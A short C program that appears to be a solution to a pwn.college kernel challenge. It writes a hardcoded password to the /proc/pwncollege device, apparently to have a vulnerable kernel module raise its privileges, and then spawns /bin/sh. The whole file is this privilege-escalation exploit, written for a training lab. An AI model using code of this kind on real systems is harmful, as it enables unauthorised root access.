#include <fcntl.h>
#include <string.h>
#include <unistd.h>

char password[] = "vqfdcevtzrwuftds";

int main() {
  int fd = open("/proc/pwncollege", O_RDWR);

  write(fd, password, strlen(password));
  execl("/bin/sh", "/bin/sh", 0);

  return 0;
}
